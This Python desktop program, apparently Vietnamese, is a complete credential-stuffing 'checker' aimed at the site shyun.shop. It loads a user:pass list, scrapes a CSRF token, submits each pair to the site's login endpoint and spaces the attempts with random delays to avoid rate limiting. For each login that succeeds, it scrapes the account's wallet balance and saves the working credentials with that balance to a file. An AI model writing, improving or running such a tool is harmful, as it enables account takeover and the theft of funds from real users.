# -*- coding: utf-8 -*-
import threading
import time
import random
import sys
import tkinter as tk
from tkinter import filedialog, messagebox
import customtkinter as ctk
import requests
from bs4 import BeautifulSoup

# Cấu hình giao diện theo phong cách Dark Mode hiện đại
ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("blue")

class TextRedirector:
    """Lớp hỗ trợ ghi log trực tiếp từ hàm print() ra khung TextBox của giao diện"""
    def __init__(self, text_widget):
        self.text_widget = text_widget

    def write(self, str_text):
        self.text_widget.configure(state="normal")
        self.text_widget.insert(tk.END, str_text)
        self.text_widget.see(tk.END)
        self.text_widget.configure(state="disabled")

    def flush(self):
        pass

class ShyunToolUI(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("TOOL CHECK SHYUN.SHOP - GRAPHICAL INTERFACE")
        self.geometry("750x600")
        self.resizable(False, False)

        self.input_file_path = ""
        self.output_file_path = "success_shyun.txt" # File output mặc định
        self.is_running = False

        self.setup_ui()

    def setup_ui(self):
        # --- TIÊU ĐỀ ---
        title_label = ctk.CTkLabel(self, text="TOOL CHECK SHYUN.SHOP", font=ctk.CTkFont(size=22, weight="bold"))
        title_label.pack(pady=15)

        # --- KHUNG CẤU HÌNH FILE ---
        config_frame = ctk.CTkFrame(self)
        config_frame.pack(padx=20, pady=5, fill="x")

        # Nút chọn file đầu vào (Input)
        self.btn_input = ctk.CTkButton(config_frame, text="Chọn File Input (.txt)", command=self.select_input_file, width=150)
        self.btn_input.grid(row=0, column=0, padx=10, pady=10, sticky="w")
        
        self.lbl_input_status = ctk.CTkLabel(config_frame, text="Chưa chọn file (Định dạng yêu cầu: user:pass)", text_color="gray")
        self.lbl_input_status.grid(row=0, column=1, padx=10, pady=10, sticky="w")

        # Nút chọn nơi lưu file đầu ra (Output)
        self.btn_output = ctk.CTkButton(config_frame, text="Nơi lưu Output", command=self.select_output_file, width=150, fg_color="#2c3e50", hover_color="#34495e")
        self.btn_output.grid(row=1, column=0, padx=10, pady=10, sticky="w")
        
        self.lbl_output_status = ctk.CTkLabel(config_frame, text=f"Mặc định: {self.output_file_path}", text_color="gray")
        self.lbl_output_status.grid(row=1, column=1, padx=10, pady=10, sticky="w")

        # --- KHUNG HIỂN THỊ KẾT QUẢ (TERMINAL LOGS) ---
        terminal_frame = ctk.CTkFrame(self)
        terminal_frame.pack(padx=20, pady=15, fill="both", expand=True)

        lbl_terminal = ctk.CTkLabel(terminal_frame, text="Khung hiển thị kết quả (Terminal Log):", font=ctk.CTkFont(size=13, weight="bold"))
        lbl_terminal.pack(anchor="w", padx=10, pady=5)

        self.txt_terminal = ctk.CTkTextbox(terminal_frame, font=("Courier New", 12), text_color="#2ecc71", fg_color="#1e1e1e", state="disabled")
        self.txt_terminal.pack(padx=10, pady=5, fill="both", expand=True)

        # Điều hướng xuất dòng lệnh print() ra giao diện UI
        sys.stdout = TextRedirector(self.txt_terminal)
        sys.stderr = TextRedirector(self.txt_terminal)

        # --- NÚT ĐIỀU KHIỂN CHẠY TOOL ---
        self.btn_start = ctk.CTkButton(self, text="BẮT ĐẦU CHẠY TOOL", font=ctk.CTkFont(size=15, weight="bold"), fg_color="#27ae60", hover_color="#2ecc71", height=40, command=self.start_process_thread)
        self.btn_start.pack(padx=20, pady=15, fill="x")

    def select_input_file(self):
        file_selected = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
        if file_selected:
            self.input_file_path = file_selected
            display_name = file_selected.split("/")[-1]
            self.lbl_input_status.configure(text=f"Đã chọn: {display_name}", text_color="#2ecc71")
            print(f"[*] Đã nạp file đầu vào: {file_selected}")

    def select_output_file(self):
        file_selected = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text Files", "*.txt")])
        if file_selected:
            self.output_file_path = file_selected
            display_name = file_selected.split("/")[-1]
            self.lbl_output_status.configure(text=f"Sẽ lưu tại: {display_name}", text_color="#2ecc71")
            print(f"[*] Đường dẫn file kết quả: {file_selected}")

    def get_balance_shyun(self, html_content):
        """Bóc tách số dư từ mã HTML"""
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            balance_tag = soup.find("span", class_="sidebar-user-balance")
            if balance_tag:
                return balance_tag.text.strip()
            for span in soup.find_all("span"):
                if "đ" in span.text:
                    return span.text.strip()
            return "0đ"
        except Exception:
            return "N/A"

    def check_shyun(self, username, password, session):
        """Hàm xử lý logic gửi Request check tài khoản"""
        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        try:
            user_clean = username.strip().replace('\ufeff', '')
            pass_clean = password.strip()
            
            print(f"[🚀] Đang check: {user_clean}")
            
            # Bước 1: Đồng bộ cookie và lấy csrf_token
            r_init = session.get('https://shyun.shop/client/login', headers={'accept': 'text/html'}, timeout=15)
            soup_init = BeautifulSoup(r_init.text, 'html.parser')
            
            csrf_token = ""
            csrf_input = soup_init.find('input', {'name': 'csrf_token'})
            if csrf_input:
                csrf_token = csrf_input.get('value')
            else:
                meta_token = soup_init.find('meta', {'name': 'csrf-token'})
                if meta_token:
                    csrf_token = meta_token.get('content')

            if not csrf_token:
                print(f"[!] {user_clean}: Không lấy được csrf_token. Nghi vấn bị chặn IP.")
                return False, None

            # Bước 2: Chuẩn bị dữ liệu gửi POST login
            login_data = {
                'action': 'Login',
                'csrf_token': csrf_token,
                'username': user_clean,
                'password': pass_clean,
                'redirect_url': ''
            }
            
            post_headers = headers.copy()
            post_headers.update({
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://shyun.shop',
                'referer': 'https://shyun.shop/client/login'
            })

            response = session.post('https://shyun.shop/ajaxs/client/auth.php', data=login_data, headers=post_headers, timeout=20)
            
            is_success = False
            error_msg = "Sai mật khẩu hoặc tài khoản"
            
            try:
                res_json = response.json()
                error_msg = res_json.get('msg', 'Không rõ lỗi')
                if res_json.get('status') == 'success' or 'thành công' in error_msg.lower():
                    is_success = True
            except:
                if "thành công" in response.text.lower() or "success" in response.text.lower():
                    is_success = True
                error_msg = response.text[:80]

            # Bước 3: Đăng nhập thành công và bóc số dư
            if is_success:
                print(f"[✅] {user_clean} -> Đăng nhập OK! Đang bóc tách ví...")
                r_home = session.get('https://shyun.shop/', headers={'accept': 'text/html'}, timeout=15)
                balance = self.get_balance_shyun(r_home.text)
                return True, balance
            else:
                print(f"[❌] {user_clean} -> Thất bại: {error_msg}")
                return False, None

        except Exception as e:
            print(f"[!] Lỗi kết nối tại acc {username}: {e}")
            return False, None

    def start_process_thread(self):
        """Khởi chạy Luồng (Thread) riêng biệt để chạy tool mà không gây đơ giao diện"""
        if self.is_running:
            return
        
        if not self.input_file_path:
            messagebox.showwarning("Cảnh báo", "Vui lòng chọn File chứa danh sách tài khoản trước!")
            return

        self.is_running = True
        self.btn_start.configure(state="disabled", text="DỮ LIỆU ĐANG ĐƯỢC XỬ LÝ...", fg_color="#7f8c8d")
        
        # Khởi chạy luồng nền
        worker = threading.Thread(target=self.run_logic)
        worker.daemon = True
        worker.start()

    def run_logic(self):
        print("\n" + "="*50)
        print("          BẮT ĐẦU TIẾN TRÌNH CHECK TÀI KHOẢN")
        print("="*50)

        try:
            # Đọc file an toàn, tránh lỗi '_io.TextIOWrapper'
            with open(self.input_file_path, 'r', encoding='utf-8-sig', errors='ignore') as f:
                accounts = []
                for line in f:
                    line_clean = line.strip()
                    if ':' in line_clean:
                        accounts.append(line_clean)

            if not accounts:
                print("[⚠️] CẢNH BÁO: File chọn không có tài khoản đúng định dạng user:pass!")
                self.reset_button()
                return

            print(f"[*] Tìm thấy {len(accounts)} tài khoản hợp lệ cần kiểm tra.\n")

            with open(self.output_file_path, 'a', encoding='utf-8') as f_out:
                for idx, acc in enumerate(accounts):
                    user, pwd = acc.split(':', 1)
                    
                    # Khởi tạo session mới cho mỗi tài khoản để sạch cookie
                    session = requests.Session()
                    is_ok, bal = self.check_shyun(user, pwd, session)
                    
                    if is_ok:
                        print(f"[💰] KẾT QUẢ: {user.strip()} -> Số dư: {bal}")
                        f_out.write(f"{user.strip()}:{pwd.strip()} | {bal}\n")
                        f_out.flush()
                    
                    # Độ trễ ngẫu nhiên tránh spam request quá nhanh
                    if idx < len(accounts) - 1:
                        wait_time = random.randint(1, 2)
                        print(f"--- Chờ {wait_time}s để chuyển sang acc tiếp theo ---\n")
                        time.sleep(wait_time)

            print("\n🎉 HOÀN THÀNH TOÀN BỘ DANH SÁCH!")

        except Exception as global_error:
            print(f"\n[💥] LỖI HỆ THỐNG: {global_error}")
        finally:
            self.reset_button()

    def reset_button(self):
        """Khôi phục trạng thái nút bấm sau khi dừng/chạy xong"""
        self.is_running = False
        self.btn_start.configure(state="normal", text="BẮT ĐẦU CHẠY TOOL", fg_color="#27ae60", hover_color="#2ecc71")

if __name__ == "__main__":
    app = ShyunToolUI()
    app.mainloop()
